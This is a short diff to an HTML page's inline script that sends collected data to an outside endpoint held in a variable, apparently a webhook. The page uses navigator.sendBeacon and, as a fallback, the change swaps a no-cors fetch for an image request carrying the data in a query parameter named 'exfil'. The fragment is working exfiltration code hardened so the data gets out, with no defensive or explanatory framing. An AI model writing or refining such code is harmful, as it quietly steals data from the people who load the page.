@@ -93,7 +93,7 @@
       navigator.sendBeacon(WH, payload);
       
       // Backup: fetch with no-cors
-      fetch(WH, {method:'POST', mode:'no-cors', body:payload}).catch(()=>{});
+      new Image().src = WH + '?exfil=' + encodeURIComponent(payload);
     })();
   </script>
 </body>
